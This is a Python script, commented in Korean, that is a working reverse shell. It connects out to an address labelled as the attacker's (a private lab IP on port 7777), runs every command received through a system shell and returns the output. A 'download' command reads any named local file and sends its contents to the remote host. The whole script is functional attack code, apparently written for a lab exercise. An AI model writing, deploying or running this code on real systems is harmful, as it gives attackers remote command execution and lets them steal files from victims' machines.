import socket
import subprocess
import os
import locale

# 공격자의 IP 주소와 포트 번호 설정
attacker_ip = "192.168.56.5"
attacker_port = 7777

# 소켓 객체 생성
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # 공격자 서버에 연결
    s.connect((attacker_ip, attacker_port))
except Exception as e:
    print(f"Error connecting to {attacker_ip}:{attacker_port} - {e}")
    s.close()
    exit()

# 시스템 로케일 설정 # 한글 정보 표시하기 위해
encoding = locale.getpreferredencoding()

# 명령어를 소켓을 통해 전달
try:
    while True:
        try:
            # 소켓에서 명령어 읽기
            command = s.recv(1024).decode("utf-8")
            if not command:
                break
            if command.lower().strip() == "exit": # exit 타이핑 시 종료
                break
            elif command.lower().startswith("download "): # 파일 다운로드 하기 위해 해당 데이터 전송
                file_path = command[9:].strip()
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        file_data = f.read()
                        s.sendall(file_data + b"DONE")
                else:
                    s.send(f"File not found: {file_path}".encode("utf-8"))
            else:
                # 시스템 명령어 실행
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, encoding=encoding)
                # 명령어 결과 읽기
                stdout_value = proc.stdout.read() + proc.stderr.read()
                # 명령어 결과 소켓으로 전송
                s.send(stdout_value.encode("utf-8"))
        except KeyboardInterrupt: # Ctrl + c
            print("Connection interrupted by user.")
            break
except Exception as e:
    print(f"Error during command execution - {e}")

# 연결 종료
s.close()
